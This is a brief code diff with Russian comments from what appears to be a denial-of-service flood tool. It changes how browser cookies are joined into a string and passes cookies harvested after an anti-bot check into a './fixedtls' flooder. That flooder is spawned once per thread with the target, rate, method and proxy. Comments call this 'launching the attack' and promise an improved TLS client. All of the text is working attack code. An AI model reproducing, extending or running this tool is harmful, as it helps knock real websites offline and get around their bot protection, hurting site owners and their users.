@@ -69,7 +69,7 @@ const randomIntFromInterval = (min, max) =>
 
 // Cookies → строка
 function cookiesToStr(cookies) {
-  return cookies.map(({ name, value }) => `${name}=${value}`).join("; ");
+  return cookies.map(({ name, value }) => `${name}=${value}`).join(";");
 }
 
 // 🔍 Детект JS защиты
@@ -183,6 +183,7 @@ const ua = uaConfig.userAgent
 
 // Запуск атаки, самописный tls можно лучше, через неделю скину нормальный.
   for (let i = 0; i < args.Threads; i++) {
+    const cookies = cookiesToStr(await page.context().cookies());
     spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
   }
 
